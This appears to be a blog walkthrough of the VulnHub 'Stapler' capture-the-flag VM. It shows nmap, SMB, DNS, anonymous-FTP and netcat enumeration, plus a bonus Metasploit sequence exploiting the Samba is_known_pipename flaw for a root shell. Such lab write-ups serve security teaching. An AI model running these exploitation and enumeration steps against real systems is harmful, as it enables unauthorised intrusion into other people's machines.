---
author: bhero
topic: vulnHub
---
Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/stapler/Stapler.zip) - PoC Page!

> Mid assessment I switched out to a clean VM for evidence, which gave the a new IP to Stapler files may reference final octet of 104/105  on the IP. They are the same VM.

### Todos

* need images or outputs from triage!

## Setup

 > TODO walkthough for setup

get stapler from the url above & setup vm: unzip and import
I'm using a sudoer standard user on Kali, but a VM will do just as well.

-----------------------------

## Basic Enum

First things first we need to find the machine. Lets use a ping scan:

``` bash
nmap -T5 -sP 192.168.56.0-255
```

This returns a fair bit of output, but at this stage I really only care about the IP address at this stage.

We can cut all the surplus text out and multi-thread with the following command:

``` bash
nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
```
Returns a couple of addresses quickly

```
192.168.56.1 # This is me
192.168.56.104 # This is Victim!
```

If you are lazy like I am sometimes, assign the target IP Address to a variable:

``` bash
STAPLER_IP=192.168.56.104
```

Typically I'll run nmap in various levels of aggression to be sure I don't miss anything, starting with a quick scan of the services:

``` bash
nmap $STAPLER_IP
```
gives us:
```
Host is up (0.00055s latency).
Not shown: 992 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
```

Interesting, lots of standard service ports open. 666 and doom?!? We'll check later but for now I'm going to check for hidden ports with a guess at versioning before we deep dive:

``` bash
sudo nmap -sV -p- $STAPLER_IP
```
all ports scan with versions gives us:
```
Host is up (0.00034s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.70%I=7%D=8/4%Time=5D470155%P=x86_64-pc-linux-gnu%r(NULL
SF:,1DA8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:A6:27:5F (Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds
```

A sneaky extra web service in there as well on port 12380, might of missed that.

-----------------------------

## Triage

Before going any further it's prudent to perform a little analysis to get an idea of what we might be facing. This way we can tailor our strategy to work up to remote code execution (RCE).

```
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
```

There is an FTP server, probrably an Active server as port 20 returns closed. In passive mode (default in most FTP Servers) the client initiates the connection and so port 20 would not explicitly refuse connection. This active configuration implies a bit of work went into the configuration, it could mean defensive measures like no anonymous logins or IP whitelisting. We will be careful probing this service initially.

```
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
```

Suggestive that box is Linux, windows rarely uses port 22 for ssh Remote Desktop typically is served over 3389 by default. This service will be hard to interact with if we can't get valid credentials. 

```
53/tcp    open   domain      dnsmasq 2.75
```

DNS is often overlooked by sys admins as it is a rarer service to re-configure after deploment. It can be used to hide services on boxes via whitelisting fqdn requests over http. This is particularly true in more advanced boxes for CTF events. It is difficult service to enumerate without configuring networking on the attacker box, but is often god for a quick win for more information on a box.

```
80/tcp    open   http        PHP cli server 5.5 or later
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
```

HTTP servers are open by default. This is typically the best place to start when enumerating a server as there are tonnes of automation options for web site enumeration.

```
123/tcp   closed ntp
```

Network Time, useful to know it is closed but no help just now

```
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack which allows SMB to work over the internet. The supporting ports 137 (name service) and 138 (datagram) are used for NetBIOS on the WinTEL stack. This helps nmap best guess a Linux service, interesting that we are using 139 and NOT 445.

```
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
```

Standard port for mysqldb access, this _should_ be set to local host-only access, could be useful but normally requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this could be a good value extraction service.

```
666/tcp   open   doom?
```

For me, this is the most intersting port. Historically is the port for [Doom](https://store.steampowered.com/app/2280/Ultimate_Doom/) by Id Software and tradtionally games make good areas to [exploit](https://www.exploit-db.com/exploits/30630). Yet when we run the nmap scan, we get what looks like an ascii output:

```
SF-Port666-TCP:V=7.70%I=7%D=8/4%Time=5D470155%P=x86_64-pc-linux-gnu%r(NULL
SF:,1DA8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0"); 
```
Could this be a custom app? Not a low hanging fruit but possibly something interesting. 

-----------------------------
## Lets go Harder

Time to get more intrusive with our recon and start poking the innards of the services.

### DNS

Starting on port 53, it is quickest to check for special info and is easy to queue up scripts for.
launching the following script is noisy, but useful for dns services. nmap has some useful scripts we could use with the command below, but without configuring our hosts file it'll run a long time for little rewards. My go to is:

``` bash
sudo nmap -Pn -sU -p 53 --script=dns* $STAPLER_IP
```
It takes ages and _SPOILER_ there are no issues picked up here why?

Lets investigate manually:

``` bash
nslookup $STAPLER_IP
```

returns:

```
** server can't find 104.56.168.192.in-addr.arpa: NXDOMAIN
``` 
Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, but I won't until it becomes a requirement.

Lets go into manual mode instead, open interactive nslookup with 

``` bash
nslookup
``` 
to play with the following commands:

``` bash
# list primary domain server: 
d1
# list secondary domain server: 
d2
# specify all dns record types and change dns server
set type=any
server 192.168.56.104
# Query new dns server for all records
192.168.55.104
# comes back
** server can't find 104.55.168.192.in-addr.arpa: REFUSED
```
Darn, no quick wins here because we don't have permissions. Might be something we want to play with later so lets park DNS for now and move on to something else.

-----------------------------

## SAMBA

Lets aggressive scan the service to get an idea of what we have

``` bash
nmap -A -p 139 $STAPLER_IP
```

returns:

```
Nmap scan report for 192.168.56.104
Host is up (0.00034s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: RED

Host script results:
|_clock-skew: mean: 39m58s, deviation: 34m37s, median: 59m57s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2019-08-04T20:57:07+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-08-04 20:57:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.52 seconds
```

the __smb-security-mode__ script suggests we can enumerate with a guest login.

A quick(ish) scripted enum to [file](/assets/vulnhub_stuff/stapler/samba_enum.txt) for the server can be done via enum4linux

``` bash
sudo enum4linux -U -S -G -P -o -n -i $STAPLER_IP > samba_enum.txt
```
But we'll go oldschool:
``` bash
smbclient -L $STAPLER_IP
```
using a blank password at the prompt gives:
```
 Sharename       Type      Comment
 ---------       ----      -------
 print$          Disk      Printer Drivers
 kathy           Disk      Fred, What are we doing here?
 tmp             Disk      All temporary files should be stored here
 IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
```
Lets see what kathy can see (note Fred's mention? //fred/kathy also works)
```
smbclient //kathy/kathy -I $STAPLER_IP -N
ls
```
gives
```
  .                                   D        0  Fri Jun  3 17:52:52 2016
  ..                                  D        0  Mon Jun  6 22:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 16:02:27 2016
  backup                              D        0  Sun Jun  5 16:04:14 2016

                19478204 blocks of size 1024. 16361644 blocks available
```

``` bash
cd kathy stuff\ # might need to tab it in!
ls
```
A file!
```
  .                                   D        0  Sun Jun  5 16:02:27 2016
  ..                                  D        0  Fri Jun  3 17:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 16:02:27 2016

                19478204 blocks of size 1024. 16361644 blocks available
```
lets get [todo-list.txt](/assets/vulnhub_stuff/stapler/todo-list.txt)
``` bash
get todo-list.txt
```
Next lets see whats in backup
``` bash
cd ..\backup
ls
```
ooh [wordpress-4.tar.gz](/assets/vulnhub_stuff/stapler/wordpress-4.tar.gz), could be interesting for source code review and an ftp config [file](/assets/vulnhub_stuff/stapler/vsftpd.conf)
```
  .                                   D        0  Sun Jun  5 16:04:14 2016
  ..                                  D        0  Fri Jun  3 17:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 16:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 18:14:46 2015
```
Lets get the files
```
get wordpress-4.tar.gz
get vsftpd.conf
```
Now we'll try the temp folder:
```
smbclient //kathy/tmp -I $STAPLER_IP -N
ls
```
Another file:
```
  .                                   D        0  Sun Aug  4 21:03:32 2019
  ..                                  D        0  Mon Jun  6 22:39:56 2016
  ls                                  N      274  Sun Jun  5 16:32:58 2016

```

And get the ls [file](/assets/vulnhub_stuff/stapler/ls.txt):
```
get ls
```

we can determin a few things from these files:
FTP has anon login and fred and kathy are both users.

> __BONUS__ Eternal Red Exploit to root: 

We get a lot of good info, but the information that is of most interest is the Samba version as 4.3.9-Ubuntu is vulnerable to Eternal Red

Doing the following shows a path to get root 

``` bash
searchsploit samba 4
# gives us
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                          | exploits/linux/remote/42084.rb
```

ok, from experience I know this should be a point and shoot to win.
fire up of msf and running the following will take us there:

``` bash
mfsconsole
search is_known_pipename
use exploit/linux/samba/is_known_pipename 
show options
set RHOSTS 192.168.56.104 #
set RPORT 139
set payload cmd/unix/interact
run

#this should get a shell, spawn a bash one:
python -c 'import pty; pty.spawn("/bin/bash")'
#then show root
id
```

We won't go through this way as Eternal Red was a serious issue that came out after this box was deployed to VulnHub. While it will work, it isn't something the box designer had in mind. 

-----------------------------

### FTP

Lets look at the ftp service: 

``` bash
ftp $STAPLER_IP 
```
returns a login
```
Connected to 192.168.56.104.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.56.104:bhero): 
# another user harry
```
lets try be anonymous:

``` bash
anonymous
#no password needed!
331 Please specify the password.
Password:
```
I'm in!, lets get a file listing!

``` Bash
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
#lets get the file
get note
```
returns the [note](/assets/vulnhub_stuff/stapler/note.txt)

```
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (36.0070 kB/s
```

After reading the [note](/assets/vulnhub_stuff/stapler/note.txt), elly is another user, and she has an ftp account!
Not much else we can do from here without going fully on the offensive, lets move on.

-----------------------------
### DOOM

Port 666 is interesting, it looks like we might have a potential custom app.
lets investigate with nc

``` bash
# connect to victim on port 666
nc $STAPLER_IP 666
```

This gives us a messy output: 

```
Pd��Hp���,2
           message2.jpgUT       +�QWJ�QWux
                                          ��z
                                             T��P���A@� �UT�T�2>��RDK�Jj�"DL[E�
                                                                               0<Ĵ�ʮn���V�W�H ����
_�dr���9��u�Y�ܳoX�Y�2�e�����=2��y}�a����>`� �:�y�����^�sC��
                                                          ��ncܤI��+j�[����=,Κ����s�޽���is�M?����eY��������]sS�bQ���AoA��9ӂ���x�Oݙ4����1�N���3w�&&q��'i�fL��\���̀ޚ��:�ũ�r����{���:i���T�/�-W׷&�N�<�\.���Ф���^���g�.ּ�|W�����j�f~��x'�󯏹O��̚��`aТ�KV��
ou����7�|��ÄO�nKܾ#)���{���g8�u([r�H~A�qYQq�w��?}��?��Ty��ժk��SW������f�F�k����y������Y_?n2���߆^
                                                                                              ����m��f".��?B����,��[�&�NbM���V��   3&M~{����-�]_��[qt��o/ֶ�������׏����_@N�����{��E������i�.L�\gD��p���Ym
SWb�N�&���vO�3A#�,��^������4�C͈�}��~�R�`wT��KTamۙf�                           I�ˇ9-a)T�$��Z��E�<C�p�Џ�u�vT�'��ST%�5��
��L}AJ�H�2�(Okɩ����dN���.npy.9��Rr9�Ү�#�Og���~�]V�BGu�=��HU���I��GTQ���
                                                                       L�ڒ��*P?����Dfv�`��k�S�P0���
���q�2��t�w����;����G����?P]�V���4<Q{>�h(}]LE�Hi��2~�@ǝ�xn籡��U���'4�z��%jow^Mo�~:� ��y򃙯νn����=fa���r�ٰ��U�t�y��B~q^7�,���:��ҩ;��ȝ��{���O 1M�ˁ�Ĉ��T��Y��Ԗ��Oְ7�:�/�7;��"3\܏��lt6"9:�?�,����My�Ք1��2�x5
                                                                        ��z��z�(ho���cGBn]�3�О�7��JA�"ֹ
                                                                                                      ��r�ej.�~�\G B���u�������!�BaB�V�'9�2��T�|�,����=�)p��w�����]T4�b�����&�k�]7��ciY"I4�P
                                                                 n�����a�t������7��e�'Qnq���l����0�#U�b����!�KFl�����!Y���w7?������_��S7�#�:�W]���o�4���֗����Uy�JU��~��+w����*l�)7c_�\rz>0m
                                                               �vۃF�q=��u��������:��c$G�ݧ}}��lii���p�8.��$9c5�x�z��P���u�З�v^Effu|LX+/S��d��y��#
Ǘ�2���ΫX<c�;�GU��#��a�$v;H6)�4x�L��������i��J$C�V�c��N�K�_����k�WDbq����W��
7'�W��l��Ct��쩘F���X�g�-!Lu��
                             `0�o����
�Lb���C�uR0@�j5�b86���!"�MM7���^������)����-�/`_�Ё5�!_h�����e�hy,0ytr�w�3�L�fGD��Df��X�o�5�w��
                                                                                              �g�p{�c^������Ga�8�/
��
  .&�]��\�.X�(���OlU �vE�_��<y7褔-Y��?6l4Ȑ�+�}�����2�ks؅����fP�(��fֳ�~*�^�YV����H��s\,���k�ԗ�����mh�$Si_���J5�   �F�`f)��2\�����O�d������ti���h�z��ɔ���7��Bc��ث�N�j"'�Mo}|`�|�܉ ����.h씩�eD�C��������v�|�H2��4��T�r�˷�ݧ���-S��;�M���g���t�v}E.rի����pݦ���),R�UȜ��`1��%��Am92���K�ql'
�"QyyEГ��,�W�   �U��
%�H�e[�,�g�fjH�#RqR��+����[���t�[��V����_:��O��7����{��m����x��k_M?@공�R�C���K��I�ῢ;����T7�Ŋ;�
                        8�{��6��V�X>�iW��%�tU:�Л�pBSK�����v��a��>���U@����:!u8�״=�g��a�
                                                                                       L�zE�W���XO"T�`�U;BfUT�2L�ȳp�G9��'�9֠1�_���d�_���������~W���c�.>�1�L��fhi���4�y{���%�0k�ٶq���jkj�F��h���u�UGj��'�2���T`(՝I�v�����9A���ᒬ��G*��H8��5�>]�2�
                                                                                                                   ����0�}�$r�sfЇ*Pb8�(�[�)��ɏޗe��1���ㄎ}
                              �6��MGݮ�.��
��6��.R�.,���i�z+4���,LwB�b*Δs��.2"nk�bȅ/\M�<̛r1b��Oi6��^~���=S��*��w�hYd�S�:�zd�ZSi��]�A�LH�3)�x�~c(^y�K"zm�[M��֙�%��ð���M�G@�jU�t�T��3>v�qڡ0��
TlO��X��a�<���ov�)�Z�f�?�����:�0о���<��,���%*D�
�9$F���$+،?a�K�hN<Ő
X����   i;i�pj��sB�ɱ?�^
����Fa�R͏X��W��8�[�?
                   �n
�':=9Y!(5)
+��b��_R�P拜��B�U�؎t�(�@ִ����y�_0��Hj/,�>TLky��%��_�|P����d�Y&o��<��B8ۺ���!���ْ/\_vi%r���KN�M�"��1�S��Q0����l
9�`P�I<���������-�$U�z���ʁ�Ut}���5Q2����S�'J��8�@%��[
�a�;�k�2��Pr���K�����a�9�|��d                        ��¾T�T��M�;�xL���M���N�SZA4�J����|����N���
V��mt�#j->P: g��V�
                   *����i�Ҳ���j�cRM���(�^��ړ��4�}kF<$Bݪ$���~��C��">��(�7�}2<�i_1��*�
                                                                                        ��(��jҕS���v:��zX�w��=��!����JE���^i�֞j?;2��iqB'����m�X:o4)���~�m?�)C�F�����sB��$�ed�]�4­�L3��a��
                                                             aIg
                                                                %��s��|:��>⒳�yR(�҈*U\�\Rۻ2j�k�2�����&ђ{ �Db�9֘hsB�(�,/||@�J����ھ1��ә�
        �x�|��^@���պ��|dpţ�v�0��k@�듃��
t�p)<Z��U�'���x�`��I7���e`�1�2��+x%��mfb �4��!2���e1�8��E�Dg+2�I��/Qi����)nd�6j�8�R��f1JV����ݷ7�
                                                  �a�C�R�Jb�Ls���j@�:~3����f�=W��<�������ӿ���}�볁��Y�
                                                                                                     >���݋QA����nB��!�I$�$\�c*�����Mr����HZ|�y��mҮΒze0��S��>�BL5s}e�z搧���$͆2����c*������f�����Z�d�Oė�
                                                                          ���]F��I�bbz#��z.i��S?gX�����q�����M-!M$��8e�ݫQ�e�y}�&E�������%\�j<t���ヵ�����)��-��
��z���F�����������AǸ�/ȧ��SF�U'<���,,�"�9b�q�%\��-�=��'o�ɲw��6�WLI?[S��7x����ϞRi&����x"�v����h�:�p��� J����h*!���i~���t� ��ܲ�G�Սf'$S���)f5w)Q����ج*�ٽ+�Ww�H>|9���V�2Eq�����遳�H6pVnYp�<��f�����������y��K}�:g�J0ӂCY�{��o*%�4���v� v���a���vW�
                                          m�����        e���;�I�eַ͜K��֣�-Kr
                                                                        ��%E���a���-3����.�`T0�ӽ�4�����:�JXD����첈x���HP�`��o�QB��1�~��n�����g��=��F�y�i�
                              �_̔v�L&e:U��L�
                                           �
                                            �Ѐ��M`��^x+o*�\�H9
                                                              W��JT~�;"ؓ?�ʋq��=�x����&����A�2���EduS.x���鯗��f�X�`?���%����5Z���Bd�R5���{k#2        ��
                          ݪ�a���e���bXl�=���Z�&K�}�D���4�NrL�dF�        ���]%W�}1�t%o
ž�5��
     Ӑ�'���*�`c��?7]����
�DE|7�{��A�_�l5c���3��1�8�I�wy�(f�UA��(D�\��Z�B�T���d�ޝWSt�#Y���!�vŴ��Q�G�:R5�٥Tv+�Lӊ��U)K���J����kf�ryX����4m$�j��Do�?��ڄ�����=�T�s��w��SL����Y�M�a"km_�-jU��6?hh��j'92t-��U��{d7%�:�'
                                                            ��5)�x�^�l��؛�uGϮ�2�����������-l�o)�(mM�����K}�J�i:�6�ap�\%�p ��(c�V9�w<��������
    ���aeL��y�9��Q6�ֹ
                    ��o��B�
